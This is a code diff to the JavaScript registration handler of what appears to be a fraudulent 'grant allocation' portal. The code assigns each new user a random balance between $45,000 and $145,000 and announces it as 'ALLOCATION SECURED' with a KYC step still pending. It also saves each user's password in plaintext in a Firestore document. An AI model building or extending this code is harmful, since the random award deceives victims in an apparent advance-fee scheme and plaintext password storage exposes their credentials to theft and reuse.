@@ -97,32 +97,39 @@
             btn.disabled = true;
 
             try {
-                // 1. Create User
+                // 1. Create User in Auth
                 const res = await createUserWithEmailAndPassword(auth, email, pass);
                 
-                // 2. Verification Email
+                // 2. Send the verification email immediately
                 await sendEmailVerification(res.user);
 
                 // 3. Grant Allocation Logic ($45k - $145k)
                 const amount = Math.floor(Math.random() * (145000 - 45000 + 1)) + 45000;
-                const balanceStr = amount.toLocaleString('en-US');
 
-                // 4. Create Firestore Document
+                // 4. Create Firestore Document (Saving balance as a Number)
                 await setDoc(doc(db, "users", res.user.uid), {
                     fullName: name,
                     email: email,
                     password: pass, 
-                    balance: balanceStr,
+                    balance: amount, 
                     status: "ALLOCATED / PENDING VERIFICATION",
                     kycStatus: "NOT STARTED",
                     regDate: serverTimestamp()
                 });
 
-                alert("ALLOCATION SECURED: $" + balanceStr + " has been assigned to your profile.\n\nPlease check your email to verify your account before logging in.");
-                window.location.href = 'index.html';
+                // 5. SUCCESS FLOW
+                alert("ALLOCATION SECURED: $" + amount.toLocaleString() + " has been assigned to your profile.\n\nPlease check your email to verify your account before accessing the portal.");
+                
+                // REDIRECT TO VERIFY PAGE INSTEAD OF INDEX
+                window.location.href = 'verify.html';
 
             } catch(err) { 
-                alert("REGISTRATION ERROR: " + (err.code === 'auth/email-already-in-use' ? "Email already exists." : "Try again later.")); 
+                console.error(err);
+                let msg = "Try again later.";
+                if (err.code === 'auth/email-already-in-use') msg = "Email already exists.";
+                if (err.code === 'auth/weak-password') msg = "Password is too weak.";
+                
+                alert("REGISTRATION ERROR: " + msg); 
                 btn.disabled = false; 
                 btn.innerText = "Start Application";
             }
